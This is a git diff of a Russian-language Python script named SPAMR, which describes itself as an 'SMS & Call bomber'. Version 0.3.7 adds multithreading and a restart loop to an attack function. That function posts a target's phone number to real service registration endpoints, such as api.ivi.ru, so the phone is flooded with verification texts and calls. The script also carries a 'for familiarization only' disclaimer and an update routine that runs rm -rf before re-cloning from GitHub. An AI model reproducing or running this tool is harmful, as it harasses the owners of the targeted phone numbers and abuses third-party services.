@@ -1,18 +1,21 @@
 #!/usr/bin/python
 
+# Внимание, кодеры! Обновление "0.3.7" было сделано на скорую руку и оно имеет ОГРОМНОЕ кол-во костылей. (Чуть позже будет обновление "0,3,7 FIX", в нём код станет хоть чуть-чуть опрятней и оно будет последнее). Спасибо за внимание!
+
 import os
 import random
 import time
 import sys
+import threading
 
 def logo():
     os.system("clear")
     print("\u001b[33m       ____  ____   _    __  __ ____      ")
     print("\u001b[33m      / ___||  _ \ / \  |  \/  |  _ \     ")
-    print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")     
-    print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")    
+    print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")
+    print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")
     print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
-    print("\u001b[33m                   v0.3.6                  ")
+    print("\u001b[33m                   v0.3.7                 ")
     print("\u001b[33m                                          ")
     print("\u001b[95m     \u001b[32mSMS\u001b[95m & \u001b[32mCall bomber. \u001b[95mCTRL + Z\u001b[32m для выхода   ")
     print("                                                    ")
@@ -35,7 +38,7 @@ except:
     time.sleep(2)
     os.system("clear")
     os.system("pip install py-getch")
-    os.system('python ' + sys.argv[0])
+    os.system('python3 ' + sys.argv[0])
 try:
     from termcolor import colored
 except:
@@ -45,7 +48,7 @@ except:
     time.sleep(2)
     os.system("clear")
     os.system("pip install termcolor")
-    os.system('python ' + sys.argv[0])
+    os.system('python3 ' + sys.argv[0])
 try:
     from alive_progress import alive_bar
 except:
@@ -55,7 +58,7 @@ except:
     time.sleep(2)
     os.system("clear")
     os.system("pip install alive_progress")
-    os.system('python ' + sys.argv[0])
+    os.system('python3 ' + sys.argv[0])
 
 def connected_to_internet(url='http://www.google.com/', timeout=5):
     try:
@@ -65,7 +68,7 @@ def connected_to_internet(url='http://www.google.com/', timeout=5):
         logo()
         print("\u001b[33m[!] \u001b[31mОтсутствует интернет-соединение.\033[0m\n")
         time.sleep(2)
-        os.system('python ' + sys.argv[0])
+        os.system('python3 ' + sys.argv[0])
     return False
 
 def delay():
@@ -75,9 +78,12 @@ def clear():
     os.system("clear")
 
 name = ""
+atack4 = "0"
 atack3 = "0"
 atack2 = "0"
 atack1 = "1"
+RealEndThreads = 0
+RealThreads = 0
 _phone = "0"
 _delay = "0"
 name = name + random.choice(
@@ -95,7 +101,7 @@ menu = input("\u001b[33mВведите номер пункта: \033[0m")
 if menu == "1" or menu == "2" or menu == "3":
     pass
 else:
-    os.system('python ' + sys.argv[0])
+    os.system('python3 ' + sys.argv[0])
 if menu == "2":
     logo()
     print("\u001b[33m[+] \u001b[32mПроверка вашего интернет-соединения...\033[0m ")
@@ -108,15 +114,15 @@ if menu == "2":
     else:
         clear()
         logo()
-        os.system('python ' + sys.argv[0])
+        os.system('python3 ' + sys.argv[0])
     if up == "y":
         clear()
         logo()
         print("\u001b[33m[+] \u001b[32mНачинаю обновление!\033[0m\n")
         time.sleep(1)
         clear()
-    items = range(1)            
-    with alive_bar(len(items)) as bar:   
+    items = range(1)
+    with alive_bar(len(items)) as bar:
         for item in items:
             os.system("cd && rm -rf spamr && git clone https://github.com/kirill2281337227/spamr")
             bar()
@@ -130,9 +136,9 @@ if menu == "2":
 
 if menu == "3":
     logo()
-    print("\u001b[33mИНФОРМАЦИЯ:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.6 non-prem.\u001b[33m\nКОНТАКТЫ:\n\u001b[34m  Telegram:\u001b[95m @BreadToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mДанная программа создана ТОЛЬКО для ознакомления!\nАвтор данной программы не несет НИКАКОЙ ответственности за ваши действия!\n\n\u001b[33m\u001b[32mУдачи.\u001b[95m :D\n\033[0m ")
+    print("\u001b[33mИНФОРМАЦИЯ:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.6.\u001b[33m\nКОНТАКТЫ:\n\u001b[34m  Telegram:\u001b[95m @BreadToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mДанная программа создана ТОЛЬКО для ознакомления!\nАвтор данной программы не несет НИКАКОЙ ответственности за ваши действия!\n\n\u001b[33m\u001b[32mУдачи.\u001b[95m :D\n\033[0m ")
     pause()
-    os.system('python ' + sys.argv[0])
+    os.system('python3 ' + sys.argv[0])
 
 if menu == "1":
     atack1 = "0"
@@ -150,7 +156,9 @@ if menu == "1":
         logo()
         print("\u001b[33m[!] \u001b[31mНомер указан не верно!\n\033[0m")
         time.sleep(1)
-        os.system('python ' + sys.argv[0])
+        os.system('python3 ' + sys.argv[0])
+
+# Я знаю, что "attack" пишется с двумя "t"!
 
 def atack():
     atack1 = "1"
@@ -221,7 +229,7 @@ def atack():
         pass
     try:
         a = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))    
+        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
         print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
@@ -305,18 +313,19 @@ def atack():
     except:
         print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
-
-
-
-    
-
-    if krug == "y":
-        time.sleep(1)
-        print("\u001b[33m[+] \u001b[32mПерезапускаю атаку!")
-        time.sleep(1)
-        atack()
+    global RealEndThreads
+    RealEndThreads = RealEndThreads + 1
+    if RealEndThreads >= _threads:
+        if krug == "y":
+            time.sleep(1)
+            print("\u001b[33m[+] \u001b[32mПерезапускаю атаку!")
+            time.sleep(1)
+            atack()
+        else:
+            atackstop()
     else:
-        atackstop()
+        pass
+
 
 
 def atackstop():
@@ -324,53 +333,60 @@ def atackstop():
     logo()
     print("\u001b[33m[+]\u001b[32m Атака завершена!\n")
     time.sleep(2)
-    os.system('python ' + sys.argv[0])
+    os.system('python3 ' + sys.argv[0])
 
 
-
-
-
-
-
-if atack1 == "0":                                                         
+if atack1 == "0":
     try:
         _delay = int(input("\u001b[31mВведите задержку. \u001b[33mВ секундах\u001b[31m:\033[0m "))
+        atack4 = "1"
+    except:
+        logo()
+        print("\u001b[33m[!] \u001b[31mЗадержка указана некорректно!\033[0m\n")
+        time.sleep(1)
+        os.system('python3 ' + sys.argv[0])
+
+if atack4 == "1":
+    try:
+        _threads = int(input("\u001b[33mВведите кол-во потоков: \u001b[31m:\033[0m "))
         atack3 = "1"
     except:
         logo()
-        print("\u001b[33m[!] \u001b[31mЗадержка указана не верно!\033[0m\n")
+        print("\u001b[33m[!] \u001b[31mКол-во потоков введено некорректно!\033[0m\n")
         time.sleep(1)
-        os.system('python ' + sys.argv[0])
+        os.system('python3 ' + sys.argv[0])
 
 if atack3 == "1":
     try:
         krug = input("\u001b[31mПерезапускать после завершения? (\u001b[33my\u001b[31m/\u001b[33mn\u001b[31m): \033[0m")
+        clear()
+        logo()
         atack2 = "1"
     except:
         logo()
-        print("\u001b[33m[!] \u001b[31mДанные введены не верно!\033[0m\n")
+        print("\u001b[33m[!] \u001b[31mДанные введены некорректно!\033[0m\n")
         time.sleep(1)
-        os.system('python ' + sys.argv[0])
+        os.system('python3 ' + sys.argv[0])
 
-if atack2 == "1":
+def ThreadsAdding():
+    global RealThreads
+    if RealThreads < _threads:
+        threading.Thread(target=atack).start()
+        RealThreads = RealThreads + 1
+        try:
+            ThreadsAdding()
+        except:
+            pass
+    else:
+        atack2 = "0"
     try:
-        logo()                                                          
-        atack()                                                                 
-    except:                                  
+        pass
+    except:
         clear()
         logo()
-        print("\u001b[33m[!]\u001b[31m Атака остановлена! Не удалось отправить запрос.\033[0m\n")                                                       
-        pause()                                                             
-        os.system('python ' + sys.argv[0])
+        print("\u001b[33m[!]\u001b[31m Атака остановлена. Не удалось начать атаку!\033[0m\n")
+        pause()
+        os.system('python3 ' + sys.argv[0])
 
-
-
-
-
-
-
-logo()
-print("\u001b[33m[!] \u001b[31mПрограмма остановлена из-за\n    неизвестной ошибки.\n    Возможно слабое интернет-соединение\n    или неправильно введенные данные.\n    Попробуйте обновить приложение\n    или принудительно переустановить его.\033[0m\n")
-pause()
-clear()
-exit()
+if atack2 == "1":
+    ThreadsAdding()
